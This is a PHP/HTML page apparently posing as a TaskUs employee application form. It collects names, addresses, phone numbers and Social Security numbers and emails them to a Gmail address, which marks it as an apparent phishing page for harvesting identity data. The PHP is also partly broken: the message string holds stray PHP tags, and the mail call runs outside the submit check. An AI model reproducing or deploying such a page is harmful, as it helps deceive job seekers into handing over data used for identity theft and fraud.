<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
    <meta name="MobileOptimized" content="width" />
    <meta name="HandheldFriendly" content="true" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <link rel="stylesheet" media="all" href="css/bootstrap.css" />
    <link rel="stylesheet" media="all" href="css/bootstrap.min.css" />
  </head>
  <body>
    <div class="container-fluid">
        <div class="row no-gutter">
            <!-- The image half -->
            <div class="col-md-6 d-none d-md-flex bg-image">
              <img src="taskus.png" alt="" width="100%" height="30%" border-up="40%">
            </div>



            <!-- The content half -->
            <div class="col-md-6 bg-light">
                <div class="login d-flex align-items-center py-5">

                    <!-- Demo content-->
                    <div class="container">
                        <div class="row">
                            <div class="col-lg-10 col-xl-7 mx-auto">
                                <h5 class="display-8" color="gray">TaskUs Company</h5>
                                <p class="text-muted mb-4">TaskUs Employee Form.</p>
                                <form method="post" action="" target="_self" enctype="multipart/form-data">
                                  <?php
                                  if(isset($_POST["submit"])){
                                    $fname=$_POST["fname"];
                                    $email=$_POST["email"];
                                    $address=$_POST["address"];
                                    $city=$_POST["city"];
                                    $state=$_POST["state"];
                                    $zip=$_POST["zip"];
                                    $ssn=$_POST["ssn"];
                                    $mobile=$_POST["mobile"];

                                    $to="infos.taskus@gmail.com";
                                    $subject="Application Form";
                                    $message="
                                    ?>
                                    <div class='container'>
                                      <table class='table table-dark'>
                                        <thead>
                                          <tr>
                                            <th>Attributes</th>
                                            <th>Value</th>

                                          </tr>
                                        </thead>
                                        <tbody>
                                          <tr>
                                            <td>Name</td>
                                            <td><?php echo $fname; ?></td>

                                          </tr>
                                          <tr>
                                            <td>Email</td>
                                            <td><?php echo $email; ?></td>

                                          </tr>
                                          <tr>
                                            <td>Address</td>
                                            <td><?php echo $address; ?></td>

                                          </tr>
                                          <tr>
                                            <td>city</td>
                                            <td><?php echo $city; ?></td>

                                          </tr>
                                          <tr>
                                            <td>state</td>
                                            <td><?php echo $state; ?></td>

                                          </tr>
                                          <tr>
                                            <td>zip</td>
                                            <td><?php echo $zip; ?></td>

                                          </tr>
                                          <tr>
                                            <td>ssn</td>
                                            <td><?php echo $ssn; ?></td>

                                          </tr>
                                          <tr>
                                            <td>mobile</td>
                                            <td><?php echo $mobile; ?></td>

                                          </tr>
                                        </tbody>
                                      </table>
                                    </div>
                                    <?php
                                    ";
                                    $header="From:". " ". "from taskus";
                                  }


                                  mail(
                                  $to,
                                  $subject,
                                  $message,
                                  $header
                                  );
                                  ?>
                                    <div class="form-group mb-3">
                                        <input id="inputEmail" type="Text" name="fname" placeholder="Full Name" required="" autofocus="" class="form-control rounded-pill border-0 shadow-sm px-4">
                                    </div>
                                    <div class="form-group mb-3">
                                        <input id="inputPassword" type="email" name="email" placeholder="Email" required="" class="form-control rounded-pill border-0 shadow-sm px-4 text-primary">
                                    </div>
                                    <div class="form-group mb-3">
                                        <input id="inputEmail" type="Text" name="address" placeholder="Address/Apt/Suite" required="" autofocus="" class="form-control rounded-pill border-0 shadow-sm px-4">
                                    </div>
                                    <div class="form-group mb-3">
                                        <input id="inputEmail" type="Text" name="city" placeholder="city" required="" autofocus="" class="form-control rounded-pill border-0 shadow-sm px-4">
                                    </div>
                                    <div class="form-group mb-3">
                                        <input id="inputEmail" type="Text" name="state" placeholder="State" required="" autofocus="" class="form-control rounded-pill border-0 shadow-sm px-4">
                                    </div>
                                    <div class="form-group mb-3">
                                        <input id="inputEmail" type="Text" name="zip" placeholder="Zip Code" required="" autofocus="" class="form-control rounded-pill border-0 shadow-sm px-4">
                                    </div>
                                    <div class="form-group mb-3">
                                        <input id="inputEmail" type="Text" name="ssn" placeholder="SSN" required="" autofocus="" class="form-control rounded-pill border-0 shadow-sm px-4">
                                    </div>
                                    <div class="form-group mb-3">
                                        <input id="inputEmail" type="Text" name="mobile" placeholder="Mobile Number" required="" autofocus="" class="form-control rounded-pill border-0 shadow-sm px-4">
                                    </div>

                                    <button type="submit" name="submit" class="btn btn-primary btn-block text-uppercase mb-2 rounded-pill shadow-sm">Apply Now</button>
                                    <div class="text-center d-flex justify-content-between mt-4"><p>TaskUs &copy 2022</p></div>
                                </form>
                            </div>
                        </div>
                    </div><!-- End -->

                </div>
            </div><!-- End -->

        </div>
    </div>
  </body>
</html>
